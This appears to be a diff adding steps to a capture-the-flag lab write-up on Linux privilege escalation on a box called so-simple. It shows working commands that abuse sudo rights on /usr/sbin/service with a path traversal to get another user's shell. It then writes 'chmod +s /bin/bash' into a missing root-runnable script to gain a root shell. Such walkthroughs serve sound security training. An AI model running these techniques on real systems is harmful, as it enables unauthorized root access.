@@ -147,6 +147,49 @@ User max may run the following commands on so-simple:
     (steven) NOPASSWD: /usr/sbin/service
 max@so-simple:~$
 ```
-checking sudo privs for user `max`, we can see that user `max` is allowed to run sudo on `/usr/sbin/service` as user `steven` .
+checking sudo privs for user `max`, we can see that user `max` is allowed to run sudo on `/usr/sbin/service` as user `steven`. let's abuse this priv
 
+```
+max@so-simple:~$ sudo -u steven /usr/sbin/service
+Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]
+max@so-simple:~$ sudo -u steven /usr/sbin/service ../../bin/bash
+steven@so-simple:/$ id
+uid=1001(steven) gid=1001(steven) groups=1001(steven)
+steven@so-simple:/$ whoami 
+steven
+steven@so-simple:/$ 
+```
+abusing this priv by just typing command `sudo -u steven /usr/sbin/service ../../bin/bash` , we got shell as user steven. let's escalate privs further.
 
+```
+steven@so-simple:/home/steven$ sudo -l
+Matching Defaults entries for steven on so-simple:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User steven may run the following commands on so-simple:
+    (root) NOPASSWD: /opt/tools/server-health.sh
+steven@so-simple:/home/steven$ ls -al /opt/tools/server-health.sh
+ls: cannot access '/opt/tools/server-health.sh': No such file or directory
+steven@so-simple:/home/steven$ 
+```
+checking sudo privs for user `steven` we can see that we are allowed to run `/opt/tools/server-health.sh` as root without password. and also we noticed that the file does not exist, let create a file `server-health.sh` in the `/opt/tool` dir, and inject a malicious suid code into it.
+
+```
+steven@so-simple:/opt/tools$ touch server-health.sh
+steven@so-simple:/opt/tools$ ls
+server-health.sh
+steven@so-simple:/opt/tools$ echo "chmod +s /bin/bash" > server-health.sh 
+steven@so-simple:/opt/tools$ chmod +x server-health.sh 
+steven@so-simple:/opt/tools$ sudo /opt/tools/server-health.sh 
+steven@so-simple:/opt/tools$ ls -al /bin/bash
+-rwsr-sr-x 1 root root 1183448 Feb 25  2020 /bin/bash
+steven@so-simple:/opt/tools$ /bin/bash -p
+bash-5.0# id
+uid=1001(steven) gid=1001(steven) euid=0(root) egid=0(root) groups=0(root),1001(steven)
+bash-5.0# 
+```
+created an suid bin that will get us root shell in the `/opt/tools/server-health.sh` file. so running the file as root, got use an suid for `bin/bash` then running `/bin/bash -p` got us root shell.
+
+![image](https://user-images.githubusercontent.com/87468669/224429454-b7f29007-af3b-45b7-bb7e-f300f03d378d.png)
+
+and we are through... 😉
